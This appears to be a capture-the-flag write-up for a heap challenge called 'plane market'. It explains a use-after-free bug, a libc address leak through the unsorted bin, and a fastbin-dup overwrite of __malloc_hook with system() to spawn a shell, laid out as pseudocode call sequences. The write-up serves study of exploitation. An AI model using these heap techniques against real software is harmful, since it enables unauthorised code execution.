# plane market

## Vulnerability
- Use After Free
- Out of Bound (Not exploited)

## Overview
* There's 7 options. But 3 options are important.
	* ![sell plane](./sell_plane.png?raw=true)
	* ![delete plane](./delete_plane.png?raw=true)
		* Allocated with any size and freed the desired heap chunk at any time.
		* But size is integer range (4 byte).
		* the structure is the followings. **not saved in heap. just only in `plane_list`**
		```c++
		struct plane {
			char *name;		// 8 byte
			int cost;		// 4 byte --> 8 byte (cuz' alignment)
			time_t t;		// 8 byte
			char *comment;	// 8 byte
			int name_size;	// 4 byte --> 8 byte (cuz' alignment)
		}
		```
	* ![change plane name](./change_plane_name.png?raw=true)
		* Once accessed in here, it's able to access the freed heap.
		* [`Use After Free`]

## Exploit
* Memory Leak
	* Using main-arena's address from unsorted bin
	```
	sell_plane(Unsorted-bin)
	sell_plane(fastbin) <--- for not merging
	...
	free(unsorted-bin)
	sell_plane(0x00) <--- not entered name, name = main-arena's address
	view_plane(idx=0) <--- print name of first chunk
	```
	* ![1](./1.png?raw=true)

* Get Shell
	* fastbin dup using UAF + overwrite malloc hook
	```
	sell_plane(fastbin1)
	sell_plane(fastbin2)
	change_plane_name(fastbin1)
	delete_plane(fastbin2) # fastbin -> 2
	delete_plane(fastbin1) # fastbin -> 1 -> 2
	change_plane_name(fastbin1) # fastbin -> 1 -> FAKE_CHUNK (&_malloc_hook)
	...
	sell_plane(fastbin) # allocated at addr of fastbin1
	```
	* ![2](./2.png?raw=true)
	* ![3](./3.png?raw=true)
	* Allocated `&_malloc_hook - 0x3`, which is name's address.
		* Notice that name's address - 0x10 has a structure of heap chunk, fastbin.
	* Just enetered the address of `system()`.
		* malloc(size) == system(size)
		* "/bin/sh\x00" is hex values of 8 bytes, so not proper at integer type.
		* "sh" is 0x6873. (good cheet) write at address of name's size.
		* malloc(size) == mallo(&0x6873) == system("sh")
	* p.s: one shot not matched :(
	
